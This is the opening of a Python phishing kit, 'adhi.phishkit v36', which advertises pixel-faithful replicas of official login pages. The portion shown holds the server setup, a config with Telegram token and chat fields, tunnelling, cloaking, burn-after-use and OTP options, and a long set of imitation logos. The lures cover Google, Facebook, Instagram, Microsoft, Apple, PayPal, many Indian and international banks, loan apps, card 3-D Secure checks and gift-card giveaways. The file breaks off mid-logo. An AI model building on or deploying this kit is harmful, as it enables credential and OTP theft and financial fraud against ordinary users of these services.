#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""adhi.phishkit v36 - pixel-faithful official replicas, single auto link, live vision+mic.

  python3 adhi.phishkit.py -p 8080
  python3 adhi.phishkit.py -p 8080 --local
"""
import argparse, base64, contextlib, csv, html, io, json, os, platform as _plat, re, secrets
import shutil, socket, sqlite3, subprocess, sys, tarfile, tempfile, threading, time, traceback
import urllib.parse, urllib.request
from datetime import datetime, timedelta
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ROOT = os.path.dirname(os.path.abspath(__file__))
DATA = os.path.join(ROOT, "data"); BIN = os.path.join(ROOT, "bin"); UPL = os.path.join(DATA, "uploads")
CFG_PATH = os.path.join(ROOT, "config.json"); DB_PATH = os.path.join(DATA, "adhi.db")
for d in (DATA, BIN, UPL):
    os.makedirs(d, exist_ok=True)
LAN_IP = "127.0.0.1"

DEF_CFG = {"port": 8080, "admin_password": "adhi", "site_title": "Sign in", "public_url": "",
           "root_mode": "last", "last_site": "instagram", "otp_len": 6, "show_badge": False,
           "trust_proxy": True, "telegram_token": "", "telegram_chat": "", "tunnel_provider": "auto",
           "redirect": {}, "vanity": {}, "otp": {}, "cloak": True, "burn": False, "instant": False,
           "maxv": 0, "ttl": 0, "geo": "", "sound": True, "notify": False}

def load_cfg():
    c = json.loads(json.dumps(DEF_CFG))
    if os.path.exists(CFG_PATH):
        try:
            for k, v in json.load(open(CFG_PATH, encoding="utf-8")).items():
                if isinstance(v, dict) and isinstance(c.get(k), dict):
                    c[k].update(v)
                else:
                    c[k] = v
        except Exception:
            pass
    if not c.get("admin_password"):
        c["admin_password"] = "adhi"
    return c

def save_cfg():
    t = CFG_PATH + ".tmp"
    json.dump(CFG, open(t, "w", encoding="utf-8"), indent=2)
    os.replace(t, CFG_PATH)

CFG = load_cfg()
ADMIN = {}; ALOCK = threading.Lock(); ATTL = 12 * 3600
TUN = None; TURL = ""; TKIND = ""; TLOCK = threading.RLock(); WATCH = {"on": False}
IS_TERMUX = ("com.termux" in (os.environ.get("PREFIX") or "")) or os.path.isdir("/data/data/com.termux")
CUR = {"dev": "a", "sens": 0, "tok": ""}

def lum(h):
    h = (h or "").lstrip("#")
    if len(h) != 6:
        return 1.0
    try:
        r, g, b = int(h[0:2], 16), int(h[2:4], 16), int(h[4:6], 16)
    except Exception:
        return 1.0
    return (0.299 * r + 0.587 * g + 0.114 * b) / 255.0

# ============================================================ official brand marks
def crest(txt, name, bg, fg="#fff", sub=""):
    w = 44 + int(len(name) * 7.0)
    return ('<svg width="%d" height="34" viewBox="0 0 %d 34" class="crest">'
            '<rect width="34" height="34" rx="7" fill="%s"/>'
            '<text x="17" y="23" font-family="Inter,Arial,sans-serif" font-size="%d" font-weight="800" '
            'fill="%s" text-anchor="middle" letter-spacing="-.4">%s</text>'
            '<text x="41" y="15" font-family="Inter,Arial,sans-serif" font-size="12" font-weight="800" '
            'fill="%s">%s</text>%s</svg>'
            % (w, w, bg, 11 if len(txt) > 2 else 14, fg, html.escape(txt), bg, html.escape(name),
               ('<text x="41" y="27" font-family="Inter,Arial,sans-serif" font-size="5.6" letter-spacing="1.3" '
                'fill="#8b93a1">%s</text>' % html.escape(sub)) if sub else ""))

GOOGLE_G = ('<svg width="24" height="24" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 '
            '1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 '
            '13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94'
            'c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" '
            'd="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 '
            '3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81'
            'l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 '
            '24 48z"/></svg>')
GOOGLE = ('<svg width="76" height="26" viewBox="0 0 76 26"><text x="0" y="20" '
          'font-family="Product Sans,Roboto,Arial,sans-serif" font-size="24" font-weight="500" '
          'letter-spacing="-1.4"><tspan fill="#4285F4">G</tspan><tspan fill="#EA4335">o</tspan>'
          '<tspan fill="#FBBC05">o</tspan><tspan fill="#4285F4">g</tspan><tspan fill="#34A853">l</tspan>'
          '<tspan fill="#EA4335">e</tspan></text></svg>')
FB = ('<svg width="28" height="28" viewBox="0 0 36 36"><path fill="#1877F2" d="M36 18C36 8.06 27.94 0 18 0S0 '
      '8.06 0 18c0 8.99 6.59 16.44 15.2 17.79V23.2h-4.57V18h4.57v-3.97c0-4.51 2.69-7 6.8-7 1.97 0 4.03.35 '
      '4.03.35v4.43h-2.27c-2.24 0-2.94 1.39-2.94 2.81V18h5l-.8 5.2h-4.2v12.59C29.41 34.44 36 26.99 36 18z"/>'
      '</svg>')
FBW = ('<svg width="20" height="20" viewBox="0 0 36 36"><path fill="#fff" d="M25 18a7 7 0 1 0-8.1 6.9v-4.9h-1.8'
       'V18h1.8v-1.6c0-1.8 1.1-2.8 2.7-2.8.8 0 1.6.1 1.6.1v1.8h-.9c-.9 0-1.2.6-1.2 1.2V18h2l-.3 2h-1.7v4.9A7 7 0 0 '
       '0 25 18z"/></svg>')
FBL = ('<svg width="30" height="30" viewBox="0 0 36 36"><path fill="#fff" d="M36 18C36 8.06 27.94 0 18 0S0 8.06 '
       '0 18c0 8.99 6.59 16.44 15.2 17.79V23.2h-4.57V18h4.57v-3.97c0-4.51 2.69-7 6.8-7 1.97 0 4.03.35 4.03.35v4.43'
       'h-2.27c-2.24 0-2.94 1.39-2.94 2.81V18h5l-.8 5.2h-4.2v12.59C29.41 34.44 36 26.99 36 18z"/></svg>')
IGG = ('<svg width="48" height="48" viewBox="0 0 48 48" fill="none"><defs>'
       '<radialGradient id="igr" cx="28%" cy="105%" r="150%"><stop offset="0" stop-color="#fdf497"/>'
       '<stop offset=".05" stop-color="#fdf497"/><stop offset=".45" stop-color="#fd5949"/>'
       '<stop offset=".6" stop-color="#d6249f"/><stop offset=".9" stop-color="#285AEB"/></radialGradient>'
       '</defs><rect x="3.1" y="3.1" width="41.8" height="41.8" rx="12" stroke="url(#igr)" stroke-width="3.2"/>'
       '<circle cx="24" cy="24" r="9.7" stroke="url(#igr)" stroke-width="3.2"/>'
       '<circle cx="35.7" cy="12.3" r="2.7" fill="url(#igr)"/></svg>')
IGW = ('<svg width="176" height="52" viewBox="0 0 176 52"><text x="0" y="39" '
       'font-family="Grand Hotel,cursive" font-size="43" fill="#262626">Instagram</text></svg>')
XLOGO = ('<svg width="27" height="27" viewBox="0 0 24 24" fill="#fff"><path d="M18.244 2.25h3.308l-7.227 8.26 '
         '8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833'
         'L7.084 4.126H5.117z"/></svg>')
GH = ('<svg width="46" height="46" viewBox="0 0 16 16" fill="#fff"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 '
      '2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94'
      '-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07'
      '-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 '
      '2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 '
      '3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42'
      '-3.58-8-8-8z"/></svg>')
MS = ('<svg width="108" height="24" viewBox="0 0 108 24"><rect x="0" y="0" width="10.5" height="10.5" '
      'fill="#f25022"/><rect x="11.5" y="0" width="10.5" height="10.5" fill="#7fba00"/>'
      '<rect x="0" y="11.5" width="10.5" height="10.5" fill="#00a4ef"/>'
      '<rect x="11.5" y="11.5" width="10.5" height="10.5" fill="#ffb900"/>'
      '<text x="28" y="17" font-family="Segoe UI,Arial" font-size="14.5" font-weight="600" fill="#5e5e5e">'
      'Microsoft</text></svg>')
APPLE = ('<svg width="32" height="38" viewBox="0 0 24 29" fill="#111"><path d="M19.6 15.4c0-3 2.5-4.5 2.6-4.6'
         '-1.4-2.1-3.6-2.4-4.4-2.4-1.9-.2-3.6 1.1-4.5 1.1s-2.4-1.1-3.9-1.1c-2 0-3.9 1.2-4.9 3-2.1 3.6-.5 9 '
         '1.5 12 1 1.4 2.2 3 3.8 2.9 1.5-.1 2.1-1 3.9-1s2.3 1 3.9 1 2.7-1.5 3.7-2.9c1.2-1.7 1.6-3.3 1.7-3.4-.1 '
         '0-3.4-1.3-3.4-4.6zM16.7 6.3c.8-1 1.4-2.4 1.2-3.8-1.2.1-2.7.8-3.6 1.8-.8.9-1.5 2.3-1.3 3.7 1.4.1 2.8-.7 '
         '3.7-1.7z"/></svg>')
LINKEDIN = ('<svg width="34" height="34" viewBox="0 0 34 34"><rect width="34" height="34" rx="3" fill="#0a66c2"/>'
            '<path fill="#fff" d="M9 12h3v11H9zM10.5 8a1.7 1.7 0 1 1 0 3.5 1.7 1.7 0 0 1 0-3.5zM14.5 12h2.9v1.5h.05'
            'c.4-.8 1.4-1.7 2.9-1.7 3.1 0 3.7 2 3.7 4.6V23h-3v-5.6c0-1.3 0-3-1.8-3s-2.1 1.4-2.1 2.9V23h-3z"/></svg>')
TGL = ('<svg width="34" height="34" viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="#2aabee"/>'
       '<path fill="#fff" d="M5.5 11.9l11.3-4.4c.5-.2 1 .1.9.8l-1.9 9c-.1.6-.5.7-1 .4l-2.8-2.1-1.4 1.3c-.2.2-.3.3-.6.3'
       'l.2-2.9 5.3-4.8c.2-.2 0-.3-.4-.1l-6.5 4.1-2.8-.9c-.6-.2-.6-.6-.3-.7z"/></svg>')
WAL = ('<svg width="34" height="34" viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="#25d366"/>'
       '<path fill="#fff" d="M17 14.4c-.3-.1-1.6-.8-1.8-.9-.2-.1-.4-.1-.6.1l-.8.9c-.1.2-.3.2-.5.1-1.2-.6-2-1.1-2.8-2.4'
       '-.2-.3.2-.4.5-.8.1-.1.1-.3 0-.4l-.8-1.8c-.2-.4-.4-.4-.6-.4h-.5c-.2 0-.5.1-.7.4-.3.3-.9 1-.9 2.1s.9 2.2 '
       '1 2.4c.1.2 1.6 2.7 4 3.5 1.5.5 2 .5 2.7.4.4-.1 1.3-.6 1.5-1.1.2-.5.2-1 .1-1.1z"/></svg>')
NFLX = ('<svg width="136" height="38" viewBox="0 0 136 38"><text x="0" y="29" font-family="Arial Black,Arial" '
        'font-size="28" font-weight="900" fill="#e50914" letter-spacing="1.2">NETFLIX</text></svg>')
SPOT = ('<svg width="114" height="35" viewBox="0 0 114 35"><circle cx="17" cy="17" r="16" fill="#1db954"/>'
        '<path d="M24 24c-5-1.6-9.2-1.2-12.5.3M25 19c-5.4-1.7-10.3-1.2-14 .5M26 14c-6.3-1.9-12.2-1.3-16.2.6" '
        'stroke="#000" stroke-width="2.5" fill="none" stroke-linecap="round"/>'
        '<text x="40" y="25" font-family="Arial" font-size="19" font-weight="700" fill="#fff">Spotify</text></svg>')
AMZN = ('<svg width="102" height="31" viewBox="0 0 102 31"><text x="0" y="21" font-family="Arial" font-size="22" '
        'font-weight="700" fill="#131921">amazon</text>'
        '<path d="M6 25c10 5 30 5 41-1" stroke="#ff9900" stroke-width="2.4" fill="none" stroke-linecap="round"/></svg>')
PPAL = ('<svg width="102" height="27" viewBox="0 0 102 27"><path fill="#003087" d="M8 2h7.5c4 0 6 2 5.4 5.6-.7 4-3.4 '
        '6.1-7.3 6.1h-2.6L9.8 19H5.9z"/><path fill="#0070e0" d="M10.4 8.2h5.2c3 0 4.4 1.5 4 4.2-.5 3.1-2.7 4.8-5.7 '
        '4.8h-1.8L11.3 21H8z" opacity=".9"/><text x="30" y="18" font-family="Verdana,Arial" font-size="15" '
        'font-style="italic" font-weight="700" fill="#003087">Pay</text>'
        '<text x="61" y="18" font-family="Verdana,Arial" font-size="15" font-style="italic" font-weight="700" '
        'fill="#0070e0">Pal</text></svg>')
ROBLOX_W = ('<svg width="144" height="29" viewBox="0 0 144 29"><rect x="1" y="2" width="23" height="23" rx="3" '
            'fill="#fff" transform="rotate(-8 12 13)"/><rect x="6.5" y="7.5" width="12" height="12" rx="1.4" '
            'fill="#232527" transform="rotate(-8 12 13)"/>'
            '<text x="31" y="21" font-family="Arial Black,Arial" font-size="20" font-weight="900" fill="#fff" '
            'letter-spacing="-0.4">ROBLOX</text></svg>')
FFIRE_W = ('<svg width="136" height="33" viewBox="0 0 136 33"><path fill="#ff9c1a" d="M12 2c2.4 3.2 1.6 4.8 0 6.4'
           '-1.6-1.6-4-.8-4 1.6 0 2.4 2.4 3.2 4 4.8 2.4 2.4 4 4.8 2.4 8-3.2 0-6.4-1.6-8-4.8-1.6-3.2-.8-7.2 '
           '1.6-10.4C9.2 5.2 10.8 3.6 12 2z"/>'
           '<text x="22" y="14" font-family="Arial Black,Arial" font-size="12" font-weight="900" fill="#fff" '
           'letter-spacing="0.6">FREE FIRE</text>'
           '<text x="22" y="25" font-family="Arial" font-size="7" letter-spacing="2.6" fill="#ff9c1a">'
           'DIAMONDS</text></svg>')
ZIGGY = ('<svg width="126" height="31" viewBox="0 0 126 31"><rect x="0" y="3" width="25" height="25" rx="8" '
         'fill="#7c3aed"/><path d="M8 9h9l-9 12h9" stroke="#fff" stroke-width="2.4" fill="none" '
         'stroke-linecap="round" stroke-linejoin="round"/><text x="31" y="22" font-family="Arial Black,Arial" '
         'font-size="18" font-weight="900" fill="#7c3aed" letter-spacing="-0.3">ZIGGY</text></svg>')
GPLAY = ('<svg width="130" height="31" viewBox="0 0 130 31"><path fill="#34a853" d="M3 3l14 12L3 27z"/>'
         '<path fill="#fbbc05" d="M3 3l10 8.5L17 8z"/><path fill="#ea4335" d="M17 8l6 7-6 7-4-6z"/>'
         '<path fill="#4285f4" d="M3 27l10-8.5L17 22z"/>'
         '<text x="28" y="14" font-family="Arial" font-size="12.5" font-weight="700" fill="#5f6368">Google Play</text>'
         '<text x="28" y="25" font-family="Arial" font-size="10" fill="#5f6368">Gift Card</text></svg>')
ITUNES = ('<svg width="130" height="31" viewBox="0 0 130 31"><rect x="0" y="3" width="25" height="25" rx="6" '
          'fill="#fa243c"/><path d="M15.5 8v9.6a3 3 0 1 1-1.6-2.6V10l5.2-1.2V7z" fill="#fff"/>'
          '<text x="31" y="15" font-family="Arial" font-size="13" font-weight="700" fill="#111">Apple Gift Card</text>'
          '<text x="31" y="26" font-family="Arial" font-size="10" fill="#6b7280">App Store &amp; iTunes</text></svg>')
PUBG = ('<svg width="126" height="31" viewBox="0 0 126 31"><rect x="0" y="3" width="25" height="25" rx="4" '
        'fill="#f2a900"/><text x="5" y="22" font-family="Arial Black,Arial" font-size="13" font-weight="900" '
        'fill="#111">UC</text><text x="31" y="15" font-family="Arial Black,Arial" font-size="13" '
        'font-weight="900" fill="#111">PUBG</text><text x="31" y="26" font-family="Arial" font-size="9" '
        'fill="#6b7280">Unknown Cash</text></svg>')
NITRO = ('<svg width="144" height="31" viewBox="0 0 144 31"><rect x="0" y="3" width="25" height="25" rx="6" '
         'fill="#5865f2"/><path d="M8 11c2.6-1.4 5.4-1.4 8 0M9 18c1.8 1 4.2 1 6 0" stroke="#fff" '
         'stroke-width="1.6" fill="none"/><circle cx="10.5" cy="14.5" r="1.2" fill="#fff"/>'
         '<circle cx="13.5" cy="14.5" r="1.2" fill="#fff"/>'
         '<text x="31" y="15" font-family="Arial" font-size="13" font-weight="800" fill="#5865f2">Discord</text>'
         '<text x="31" y="26" font-family="Arial" font-size="10" fill="#6b7280">Nitro Gift</text></svg>')
STEAMG = ('<svg width="132" height="31" viewBox="0 0 132 31"><circle cx="12" cy="15" r="11" fill="#66c0f4"/>'
          '<circle cx="9" cy="12" r="3.2" fill="#1b2838"/><circle cx="16" cy="18" r="2.4" fill="#1b2838"/>'
          '<text x="28" y="15" font-family="Arial" font-size="13" font-weight="700" fill="#66c0f4">Steam</text>'
          '<text x="28" y="26" font-family="Arial" font-size="10" fill="#6b7280">Wallet Gift</text></svg>')
VBUCKS = ('<svg width="134" height="31" viewBox="0 0 134 31"><rect x="0" y="3" width="25" height="25" rx="5" '
          'fill="#2a2a72"/><text x="4" y="22" font-family="Arial Black,Arial" font-size="12" font-weight="900" '
          'fill="#fff">VB</text><text x="31" y="15" font-family="Arial" font-size="13" font-weight="800" '
          'fill="#2a2a72">Fortnite</text><text x="31" y="26" font-family="Arial" font-size="10" '
          'fill="#6b7280">V-Bucks</text></svg>')
COC = ('<svg width="134" height="31" viewBox="0 0 134 31"><rect x="0" y="3" width="25" height="25" rx="5" '
       'fill="#c0392b"/><text x="5" y="22" font-family="Arial Black,Arial" font-size="12" font-weight="900" '
       'fill="#fff">G</text><text x="31" y="15" font-family="Arial" font-size="12.5" font-weight="800" '
       'fill="#c0392b">Clash of Clans</text><text x="31" y="26" font-family="Arial" font-size="10" '
       'fill="#6b7280">Gems</text></svg>')
MINECOINS = ('<svg width="140" height="31" viewBox="0 0 140 31"><rect x="0" y="3" width="25" height="25" rx="4" '
             'fill="#3c8527"/><rect x="5" y="8" width="7" height="7" fill="#fff"/><rect x="13" y="16" width="7" '
             'height="7" fill="#fff"/><text x="31" y="15" font-family="Arial" font-size="12" font-weight="800" '
             'fill="#3c8527">Minecraft</text><text x="31" y="26" font-family="Arial" font-size="10" '
             'fill="#6b7280">Minecoins</text></svg>')
LOCK = ('<svg width="11" height="11" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2a5 5 0 0 1 5 5v2h.5'
        'A2.5 2.5 0 0 1 20 11.5v8A2.5 2.5 0 0 1 17.5 22h-11A2.5 2.5 0 0 1 4 19.5v-8A2.5 2.5 0 0 1 6.5 9H7V7a5 5 0 0 1 5-5z'
        'm0 2a3 3 0 0 0-3 3v2h6V7a3 3 0 0 0-3-3zm0 9.2a1.8 1.8 0 0 0-1 3.3V19h2v-2.5a1.8 1.8 0 0 0-1-3.3z"/></svg>')
TICK = ('<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.4" '
        'stroke-linecap="round"><path d="M4 12.5l5 5L20 6.5"/></svg>')
DLIC = ('<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" '
        'stroke-linecap="round"><path d="M12 3v12"/><path d="M7 11l5 5 5-5"/><path d="M4 21h16"/></svg>')
CARET = ('<svg width="9" height="6" viewBox="0 0 9 6" fill="none" stroke="currentColor" stroke-width="1.3">'
         '<path d="M1 1l3.5 3.5L8 1"/></svg>')

CATAG = {"bank": "INTERNET BANKING", "loan": "LOANS & CARDS", "gov": "GOVERNMENT PORTAL",
         "tel": "TELECOM", "ship": "TRACKING", "dev": "DEVELOPER", "cloud": "CLOUD STORAGE",
         "work": "WORKSPACE", "game": "GAMING", "shop": "SHOPPING", "pay": "PAYMENTS",
         "sensor": "DEVICE CHECK", "crypto": "WALLET", "gift": "REDEEM CODE"}

LOGO = {
 "google": GOOGLE, "gpay": GOOGLE, "googledrive": GOOGLE, "facebook": FB, "instagram": IGG,
 "igfollowers": IGG, "x": XLOGO, "twitter": XLOGO, "linkedin": LINKEDIN, "github": GH,
 "microsoft": MS, "office365": MS, "outlook": MS, "azure": MS, "onedrive": MS, "xbox": MS,
 "apple": APPLE, "appleid": APPLE, "icloud": APPLE, "whatsapp": WAL, "telegram": TGL,
 "netflix": NFLX, "spotify": SPOT, "amazon": AMZN, "amazonpay": AMZN, "paypal": PPAL,
 "roblox-gift": ROBLOX_W, "roblox-robux": ROBLOX_W, "roblox": ROBLOX_W,
 "ff-diamond": FFIRE_W, "ff-diamonds": FFIRE_W, "ff-pass": FFIRE_W, "freefire": FFIRE_W,
 "ziggy-gift": ZIGGY, "gplay-gift": GPLAY, "itunes-gift": ITUNES, "pubg-uc": PUBG, "uc-free": PUBG,
 "discord-nitro": NITRO, "nitro-free": NITRO, "steam-gift": STEAMG, "steam-wallet": STEAMG,
 "vbucks": VBUCKS, "coc-gems": COC, "minecoins": MINECOINS,
 "sbi": crest("SBI", "State Bank of India", "#22409a", sub="INTERNET BANKING"),
 "hdfc": crest("HDFC", "HDFC Bank", "#004c8f", sub="NETBANKING"),
 "icici": crest("i", "ICICI Bank", "#ae282e", sub="NETBANKING"),
 "axis": crest("AX", "Axis Bank", "#97144d", sub="NETBANKING"),
 "kotak": crest("K", "Kotak Bank", "#003874", sub="NETBANKING"),
 "canara": crest("CB", "Canara Bank", "#123a7a", sub="NETBANKING"),
 "bob": crest("BOB", "Bank of Baroda", "#f16522", sub="NETBANKING"),
 "pnb": crest("PNB", "PNB", "#a41e34", sub="NETBANKING"),
 "union": crest("UBI", "Union Bank", "#003874", sub="NETBANKING"),
 "idfc": crest("IDFC", "IDFC First", "#9c1c2b", sub="NETBANKING"),
 "yes": crest("YES", "YES Bank", "#00518f", sub="NETBANKING"),
 "indusind": crest("IIB", "IndusInd Bank", "#98211f", sub="NETBANKING"),
 "federal": crest("FB", "Federal Bank", "#0a3d62", sub="NETBANKING"),
 "rbl": crest("RBL", "RBL Bank", "#00468b", sub="NETBANKING"),
 "bandhan": crest("BB", "Bandhan Bank", "#a5172b", sub="NETBANKING"),
 "boi": crest("BOI", "Bank of India", "#f47b20", sub="NETBANKING"),
 "chase": crest("C", "Chase", "#117aca", sub="ONLINE BANKING"),
 "bofa": crest("BA", "Bank of America", "#e31837", sub="ONLINE BANKING"),
 "wellsfargo": crest("WF", "Wells Fargo", "#d71e28", sub="ONLINE BANKING"),
 "citi": crest("C", "Citibank", "#056dae", sub="ONLINE BANKING"),
 "hsbc": crest("HSBC", "HSBC", "#db0011", sub="ONLINE BANKING"),
 "barclays": crest("B", "Barclays", "#00aeef", sub="ONLINE BANKING"),
 "dbs": crest("DBS", "DBS Bank", "#ec1c24", sub="ONLINE BANKING"),
 "sc": crest("SC", "Standard Chartered", "#0473ea", sub="ONLINE BANKING"),
 "au": crest("AU", "AU Small Finance", "#6a2c8f", sub="NETBANKING"),
 "ujjivan": crest("UB", "Ujjivan Bank", "#e4002b", sub="NETBANKING"),
 "equitas": crest("EQ", "Equitas Bank", "#0e7c7b", sub="NETBANKING"),
 "csb": crest("CSB", "CSB Bank", "#1b5e20", sub="NETBANKING"),
 "kvb": crest("KVB", "KVB Bank", "#7a1f2b", sub="NETBANKING"),
 "tmb": crest("TMB", "Tamilnad Mercantile", "#8a1c1c", sub="NETBANKING"),
 "jkb": crest("JKB", "J&K Bank", "#0b4f8a", sub="NETBANKING"),
 "sbi-loan": crest("SBI", "SBI Loans", "#22307a", sub="LOANS"),
 "hdfc-loan": crest("HDFC", "HDFC Loans", "#004c8f", sub="LOANS"),
 "icici-loan": crest("i", "ICICI Loans", "#ae282e", sub="LOANS"),
 "axis-loan": crest("AX", "Axis Loans", "#97144d", sub="LOANS"),
 "kotak-loan": crest("K", "Kotak Loans", "#003874", sub="LOANS"),
 "bajaj-loan": crest("BF", "Bajaj Finserv", "#0033a0", sub="FINANCE"),
 "tatacap-loan": crest("TC", "Tata Capital", "#486aae", sub="FINANCE"),
 "lnt-loan": crest("L&T", "L&T Finance", "#f7941e", sub="FINANCE"),
 "idfc-loan": crest("IDFC", "IDFC First Loans", "#9c1c2b", sub="LOANS"),
 "indusind-loan": crest("IIB", "IndusInd Loans", "#98211f", sub="LOANS"),
 "yes-loan": crest("YES", "YES Bank Loans", "#00518f", sub="LOANS"),
 "rbl-loan": crest("RBL", "RBL Loans", "#00468b", sub="LOANS"),
 "fullerton-loan": crest("FI", "Fullerton India", "#e31e24", sub="FINANCE"),
 "piramal-loan": crest("PF", "Piramal Finance", "#c8102e", sub="FINANCE"),
 "abcl-loan": crest("ABC", "Aditya Birla Capital", "#d6001c", sub="FINANCE"),
 "hero-loan": crest("HF", "Hero FinCorp", "#e4002b", sub="FINANCE"),
 "mahindra-loan": crest("MF", "Mahindra Finance", "#c8102e", sub="FINANCE"),
 "shriram-loan": crest("SF", "Shriram Finance", "#f58220", sub="FINANCE"),
 "manappuram-loan": crest("MG", "Manappuram", "#004a99", sub="GOLD LOAN"),
 "muthoot-loan": crest("MF", "Muthoot Finance", "#c8102e", sub="GOLD LOAN"),
 "iifl-loan": crest("IIFL", "IIFL Finance", "#f26522", sub="FINANCE"),
 "navi-loan": crest("N", "Navi", "#3d5afe", sub="LOANS"),
 "kreditbee-loan": crest("KB", "KreditBee", "#00b2a9", sub="LOANS"),
 "moneyview-loan": crest("MV", "Money View", "#7b2d8e", sub="LOANS"),
 "slice-loan": crest("s", "slice", "#8b5cf6", sub="CARD"),
 "cred-loan": crest("CRED", "CRED", "#111111", sub="CARD"),
 "onecard-loan": crest("1C", "OneCard", "#1a1a1a", sub="CARD"),
 "dhani-loan": crest("D", "Dhani", "#f5a623", sub="LOANS"),
 "kissht-loan": crest("K", "Kissht", "#ff5722", sub="LOANS"),
 "mobikwik-loan": crest("MK", "MobiKwik", "#e4002b", sub="LOANS"),
 "fibe-loan": crest("F", "Fibe", "#5a2d82", sub="LOANS"),
 "paysense-loan": crest("PS", "PaySense", "#0f766e", sub="LOANS"),
 "mpocket-loan": crest("mP", "mPokket", "#1f6fb2", sub="LOANS"),
 "cashe-loan": crest("C", "CASHe", "#e2452c", sub="LOANS"),
 "smartcoin-loan": crest("SC", "SmartCoin", "#0b7285", sub="LOANS"),
 "cardapply": crest("CC", "Credit Card Apply", "#1a1f71", sub="APPLICATION"),
 "debitupgrade": crest("DU", "Debit Card Upgrade", "#0b5c3f", sub="UPGRADE"),
 "limitincrease": crest("LI", "Credit Limit", "#6b21a8", sub="ENHANCEMENT"),
 "instantloan": crest("IL", "Instant Loan", "#0f766e", sub="LOANS"),
 "goldloan": crest("GL", "Gold Loan", "#8a6d1f", sub="GOLD"),
 "sensor": ('<svg width="130" height="27" viewBox="0 0 130 27"><rect width="27" height="27" rx="7" fill="#3b82f6"/>'
            '<path d="M13.5 6l6 3v5c0 4-2.6 6-6 7-3.4-1-6-3-6-7v-5z" fill="#fff"/>'
            '<path d="M11 13.4l1.8 1.9 3.2-3.6" stroke="#3b82f6" stroke-width="1.7" fill="none"/></svg>'),
 "sensorbank": crest("BK", "Bank Device Check", "#0b3d6b", sub="SECURE"),
 "sensorekyc": crest("EK", "eKYC Verify", "#12305c", sub="KYC"),
 "cardcheck": crest("CV", "Card Verify", "#1a1a2e", sub="3-D SECURE"),
 "visa": ('<svg width="74" height="26" viewBox="0 0 74 26"><text x="0" y="20" font-family="Arial Black,Arial" '
          'font-size="21" font-weight="900" fill="#1a1f71" letter-spacing="-0.6">VISA</text></svg>'),
 "mastercard": ('<svg width="116" height="26" viewBox="0 0 116 26"><circle cx="11" cy="13" r="10" fill="#eb001b"/>'
                '<circle cx="24" cy="13" r="10" fill="#f79e1b" opacity=".9"/>'
                '<text x="41" y="18" font-family="Arial" font-size="11" font-weight="800" fill="#1a1a1a">ID CHECK'
                '</text></svg>'),
 "amex": ('<svg width="124" height="26" viewBox="0 0 124 26"><text x="0" y="18" font-family="Arial" font-size="13" '
          'font-weight="800" fill="#006fcf" letter-spacing="-0.3">AMERICAN EXPRESS</text></svg>'),
 "rupay": ('<svg width="80" height="26" viewBox="0 0 80 26"><text x="0" y="20" font-family="Arial" '
           'font-size="20" font-weight="800" fill="#097939">RuPay</text></svg>'),
 "youtube": ('<svg width="104" height="24" viewBox="0 0 104 24"><rect x="0" y="1" width="30" height="21" rx="6" '
             'fill="#ff0000"/><path d="M12 7l9.5 4.7L12 16.5z" fill="#fff"/><text x="35" y="18" font-family="Arial" '
             'font-size="16.5" font-weight="700" fill="#0f0f0f" letter-spacing="-0.8">YouTube</text></svg>'),
 "tiktok": ('<svg width="98" height="26" viewBox="0 0 98 26"><path d="M9.5 3h3v12.5a2.6 2.6 0 1 0 2.6-2.6v-3'
            'A5.7 5.7 0 1 1 9.5 15.5z" fill="#25f4ee"/><path d="M11 2.4h3v12.5a2.6 2.6 0 1 0 2.6-2.6v-3'
            'A5.7 5.7 0 1 1 11 14.9z" fill="#fe2c55" opacity=".85"/>'
            '<text x="22" y="19" font-family="Arial" font-size="17.5" font-weight="800" fill="#fff">TikTok</text></svg>'),
 "snapchat": ('<svg width="34" height="34" viewBox="0 0 24 24"><path fill="#FFFC00" stroke="#111" stroke-width=".7" '
              'd="M12 3c3 0 4.6 2 4.6 5 0 1 .1 1.7.3 2.2.4.2 1-.2 1.4 0 .5.2.5.9 0 1.2-.6.3-1.4.3-1.7.7-.2.4.2 '
              '1.1.7 1.7.7.8 1.7 1.2 2.4 1.4.4.1.4.5 0 .7-.5.3-1.4.3-1.7.6-.2.2-.1.7-.4.9-.3.2-1 0-1.6.1-.6.1-1 '
